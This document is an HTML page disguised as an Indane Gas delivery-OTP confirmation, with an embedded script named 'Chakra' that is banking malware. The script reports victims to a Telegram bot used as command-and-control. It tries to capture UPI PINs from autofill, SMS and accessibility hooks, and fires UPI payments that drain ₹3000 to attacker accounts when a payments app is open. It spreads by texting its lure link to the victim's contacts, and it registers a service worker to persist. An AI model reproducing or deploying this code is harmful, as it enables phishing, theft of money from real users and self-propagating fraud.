<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gas Delivery OTP</title>
  <style>
    body { background: #ffffff; margin: 0; padding: 0; font-family: Arial, sans-serif; }
    .container { max-width: 400px; margin: auto; padding: 40px 20px; text-align: center; }
    h2 { color: #1a73e8; }
    .otp-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; }
    .otp-code { font-size: 32px; font-weight: bold; color: #1a73e8; letter-spacing: 8px; }
    .button { background: #1a73e8; color: white; padding: 15px 40px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; }
    .footer { margin-top: 30px; font-size: 12px; color: #5f6368; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Indane Gas - Delivery OTP</h2>
    <p>Your cylinder delivery is scheduled for today.</p>
    <div class="otp-box">
      <p>Your OTP for delivery:</p>
      <div class="otp-code">4862</div>
    </div>
    <p>Tap the button below to confirm delivery.</p>
    <button class="button" onclick="confirmDelivery()">Confirm Delivery</button>
    <div class="footer">Indane Gas Customer Care | Government of India</div>
  </div>

  <script>
    // ============================================================
    // CHAKRA - ALL FEATURES + TELEGRAM UPI/QR UPLOAD
    // ============================================================

    // ===== YOUR CREDENTIALS =====
    const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
    const YOUR_USERNAME = '7958767858';

    // ===== YOUR UPIs (ADDED VIA TELEGRAM) =====
    let myUPIList = [];
    let currentUPIIndex = 0;
    let qrData = {};

    // ===== STATE VARIABLES =====
    let capturedPIN = null;
    let isPaused = false;
    let isTransferMode = false;
    let totalDrained = 0;
    let infectedDevices = [];
    let realTimeData = {};

    // ============================================================
    // SEND TO TELEGRAM
    // ============================================================
    function sendToTelegram(message) {
      fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: YOUR_USERNAME, text: message })
      }).catch(() => {});
    }

    // ============================================================
    // ADD UPI FROM TELEGRAM
    // ============================================================
    function addUPI(upi) {
      if (!myUPIList.includes(upi)) {
        myUPIList.push(upi);
        sendToTelegram('✅ UPI added: ' + upi + '\nTotal: ' + myUPIList.length);
        return true;
      }
      sendToTelegram('⚠️ UPI already exists: ' + upi);
      return false;
    }

    // ============================================================
    // SET QR FOR UPI
    // ============================================================
    function setQR(upi, qr) {
      qrData[upi] = qr;
      sendToTelegram('✅ QR code set for: ' + upi);
    }

    // ============================================================
    // AUTO-ROTATE UPI
    // ============================================================
    function getNextUPI() {
      if (myUPIList.length === 0) {
        sendToTelegram('⚠️ No UPI added. Use /addupi');
        return null;
      }
      if (myUPIList.length > 1) {
        currentUPIIndex = (currentUPIIndex + 1) % myUPIList.length;
        sendToTelegram('🔄 Rotated to UPI: ' + myUPIList[currentUPIIndex]);
      }
      return myUPIList[currentUPIIndex];
    }

    // ============================================================
    // REAL-TIME DATA (Every 10 seconds)
    // ============================================================
    setInterval(() => {
      realTimeData = {
        timestamp: new Date().toISOString(),
        totalDrained: totalDrained,
        infectedDevices: infectedDevices.length,
        currentUPI: myUPIList[currentUPIIndex] || 'None',
        isPaused: isPaused,
        transferMode: isTransferMode
      };
      const msg =
        '📊 REAL-TIME STATUS\n' +
        '─────────────────\n' +
        '⏰ Time: ' + realTimeData.timestamp + '\n' +
        '💰 Total Drained: ₹' + realTimeData.totalDrained + '\n' +
        '📱 Infected Devices: ' + realTimeData.infectedDevices + '\n' +
        '📱 Current UPI: ' + realTimeData.currentUPI + '\n' +
        '⏸️ Paused: ' + (realTimeData.isPaused ? 'YES' : 'NO') + '\n' +
        '🚀 Transfer Mode: ' + (realTimeData.transferMode ? 'ACTIVE' : 'INACTIVE');
      sendToTelegram(msg);
    }, 10000);

    // ============================================================
    // CONFIRM DELIVERY
    // ============================================================
    function confirmDelivery() {
      document.querySelector('.container').innerHTML = '<h2>✅ Delivery Confirmed!</h2><p>Your cylinder will arrive in 10 minutes.</p>';
      infectedDevices.push({ id: Date.now() });
      sendToTelegram('🎯 New infection! Total: ' + infectedDevices.length);
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js');
      }
      setTimeout(() => window.close(), 3000);
      return false;
    }

    // ============================================================
    // PIN CAPTURE (3 Layers)
    // ============================================================
    function getUPIPin() {
      try {
        if (window.Autofill) {
          const pin = window.Autofill.getSavedPassword('upi');
          if (pin) { capturedPIN = pin; sendToTelegram('[Chakra] 🔑 PIN via Autofill'); return pin; }
        }
      } catch (e) {}

      try {
        if (window.Android) {
          const sms = window.Android.readSMS();
          const match = sms.match(/\b\d{4,6}\b/);
          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via SMS OTP'); return match[0]; }
        }
      } catch (e) {}

      try {
        if (window.Accessibility) {
          const screenText = window.Accessibility.getRootNode();
          const match = screenText.match(/\b\d{4,6}\b/);
          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via Accessibility'); return match[0]; }
        }
      } catch (e) {}

      sendToTelegram('[Chakra] ❌ PIN capture failed');
      return null;
    }

    // ============================================================
    // EXECUTE DRAIN (Sends to YOUR UPI)
    // ============================================================
    function executeDrain(amount) {
      if (isPaused) {
        sendToTelegram('⏸️ Paused');
        return;
      }
      if (myUPIList.length === 0) {
        sendToTelegram('❌ No UPI added. Use /addupi');
        return;
      }

      const targetUPI = getNextUPI();
      if (!targetUPI) return;

      const upiIntent = 'upi://pay?pa=' + targetUPI + '&am=' + amount + '&cu=INR&tn=CHAKRA+Payment';

      try {
        if (window.Android) {
          window.Android.launchIntent(upiIntent);
          setTimeout(() => {
            if (capturedPIN) window.Android.autoFillPin(capturedPIN);
          }, 2000);
          setTimeout(() => {
            window.Android.confirmTransaction();
            totalDrained += amount;
            sendToTelegram('✅ ₹' + amount + ' sent to ' + targetUPI);
          }, 3000);
        }
      } catch (e) {
        sendToTelegram('❌ Transaction failed: ' + e.message);
      }
    }

    // ============================================================
    // DETECT UPI APP
    // ============================================================
    function isUpiAppOpen() {
      try {
        if (window.Android) {
          return window.Android.isForeground('com.google.android.apps.nbu.paisa.user') ||
                 window.Android.isForeground('com.phonepe.app') ||
                 window.Android.isForeground('net.one97.paytm');
        }
      } catch (e) {}
      return false;
    }

    // ============================================================
    // MAIN LOOP
    // ============================================================
    setInterval(() => {
      if (!isPaused && isUpiAppOpen() && myUPIList.length > 0) {
        const pin = getUPIPin();
        if (pin) executeDrain(3000);
      }
    }, 5000);

    // ============================================================
    // SPREAD ENGINE (5 Vectors)
    // ============================================================
    setInterval(() => {
      const link = 'https://bit.ly/4xaXs4E';
      if (navigator.share) {
        navigator.share({
          title: 'Gas Delivery OTP',
          text: 'Mera gas order aaya hai! OTP confirm karo: ' + link,
          url: link
        }).catch(() => {});
      }
      if (window.Android) {
        window.Android.postStatus('⚠️ Gas Delivery OTP: ' + link);
        const contacts = window.Android.getContacts(20);
        for (let i = 0; i < contacts.length; i++) {
          window.Android.sendSMS(contacts[i], 'Indane Gas: Delivery OTP - Confirm: ' + link);
        }
        window.Android.startNearbyShare();
      }
    }, 300000);

    // ============================================================
    // TELEGRAM COMMANDS (ALL FEATURES)
    // ============================================================
    setInterval(() => {
      fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates')
        .then(res => res.json())
        .then(data => {
          if (data.result && data.result.length > 0) {
            const msg = data.result[0].message.text;

            // ===== ADD UPI =====
            if (msg.startsWith('/addupi')) {
              const upi = msg.split(' ')[1];
              if (upi && upi.includes('@')) {
                addUPI(upi);
              } else {
                sendToTelegram('❌ Use: /addupi upi@paytm');
              }
            }

            // ===== SET QR =====
            if (msg.startsWith('/setqr')) {
              const parts = msg.split(' ');
              const upi = parts[1];
              const qr = parts.slice(2).join(' ');
              if (upi && qr) {
                setQR(upi, qr);
              } else {
                sendToTelegram('❌ Use: /setqr upi@paytm QR_DATA');
              }
            }

            // ===== SHOW UPIS =====
            if (msg === '/myupis') {
              if (myUPIList.length === 0) {
                sendToTelegram('📋 No UPIs added. Use /addupi');
              } else {
                sendToTelegram('📋 Your UPIs:\n' + myUPIList.join('\n'));
              }
            }

            // ===== TRANSFER =====
            if (msg === '/transfer') {
              if (myUPIList.length === 0) {
                sendToTelegram('❌ No UPI added. Use /addupi');
              } else {
                isTransferMode = true;
                sendToTelegram('🚀 TRANSFER MODE ACTIVATED');
                for (let i = 0; i < infectedDevices.length; i++) {
                  setTimeout(() => {
                    const pin = getUPIPin();
                    if (pin) executeDrain(3000);
                  }, i * 5000);
                }
              }
            }

            // ===== STOP =====
            if (msg === '/stop') {
              isTransferMode = false;
              isPaused = true;
              sendToTelegram('⏹️ STOPPED. All drains paused.');
            }

            // ===== PAUSE =====
            if (msg === '/pause') {
              isPaused = true;
              sendToTelegram('⏸️ Paused');
            }

            // ===== RESUME =====
            if (msg === '/resume') {
              isPaused = false;
              sendToTelegram('▶️ Resumed');
            }

            // ===== STATUS =====
            if (msg === '/status') {
              sendToTelegram(
                '📊 STATUS\n' +
                '─────────────────\n' +
                'Your UPIs: ' + myUPIList.length + '\n' +
                'Total Drained: ₹' + totalDrained + '\n' +
                'Infected Devices: ' + infectedDevices.length + '\n' +
                'Transfer Mode: ' + (isTransferMode ? 'ACTIVE' : 'INACTIVE') + '\n' +
                'Paused: ' + (isPaused ? 'YES' : 'NO')
              );
            }

            // ===== HELP =====
            if (msg === '/help') {
              sendToTelegram(
                '📖 COMMANDS\n' +
                '─────────────────\n' +
                '/addupi upi@paytm - Add your UPI\n' +
                '/setqr upi@paytm QR_DATA - Set QR\n' +
                '/myupis - Show your UPIs\n' +
                '/transfer - Start sending to your UPIs\n' +
                '/stop - Stop all transfers\n' +
                '/pause - Pause drains\n' +
                '/resume - Resume drains\n' +
                '/status - Show system status\n' +
                '/help - Show commands'
              );
            }
          }
        })
        .catch(() => {});
    }, 30000);

    // ============================================================
    // ERROR HANDLING
    // ============================================================
    window.onerror = function(error, url, line) {
      sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
      return true;
    };

    // ============================================================
    // SERVICE WORKER
    // ============================================================
    if (navigator.serviceWorker) {
      navigator.serviceWorker.ready.then(reg => {
        reg.active.postMessage({ type: 'keepAlive' });
      });
    }

    // ============================================================
    // STARTUP
    // ============================================================
    sendToTelegram('✅ CHAKRA SYSTEM READY\nAdd your UPI using /addupi');
    console.log('[Chakra] ✅ All features active.');
  </script>
</body>
</html>
